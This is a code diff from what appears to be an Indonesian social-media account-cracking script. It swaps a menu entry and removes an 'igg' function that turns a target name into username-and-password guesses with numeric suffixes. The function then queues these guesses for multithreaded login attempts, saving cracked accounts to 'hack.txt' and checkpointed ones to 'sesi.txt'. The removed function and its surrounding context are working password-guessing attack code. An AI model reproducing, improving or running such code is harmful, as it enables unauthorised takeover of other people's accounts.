@@ -202,7 +202,7 @@ def menu():
     	postingan()
     	atursandi()
     elif asw == "5":
-    	igg()
+    	fbbaru()
         atursandi()
     elif asw == "6":
     	useragent()
@@ -239,22 +239,6 @@ def publik():
         print('%s \x1b[1;92m║'%(O))
 	print(" \x1b[1;92m╠══[\x1b[1;93m+\x1b[1;92m] \x1b[1;93mtotal id  \x1b[1;93m: %s%s%s\x1b[1;92m"%(M,len(id),N)) 
   
-def igg():
-	print ("\n%s [%s!%s] Contoh %s: %sRahma "%(P,M,P,M,O))
-	usr_ = raw_input('%s [?] Input > %s'%(P,O))
-	jumlah = input('%s [?] Limit > %s'%(P,O))
-	bff_2 = usr_.replace(" ", "")
-	cr.append("ramdhan_ramadhian")
-	mi.append(bff_2+"|"+bff_2)
-	mi.append(bff_2+"_"+"|"+bff_2)
-	for _i_ in range(1, jumlah+1):
-		mi.append(bff_2+str(_i_)+"|"+bff_2)
-		mi.append(bff_2+"_"+str(_i_)+"|"+bff_2)
-		mi.append(bff_2+str(_i_)+"_"+"|"+bff_2)
-	print '\n%s [%s*%s] akun %sOK%s tersimpan di >%s hack.txt'%(P,K,P,H,P,H);jeda(0.2)
-	print '%s [%s*%s] akun %sCP %stersimpan di > %s sesi.txt\n'%(P,K,P,K,P,K);jeda(0.2)
-	with ThreadPoolExecutor(max_workers=30) as log:
-
 ### DUMP MASSAL ###
 def massal():
 	global token
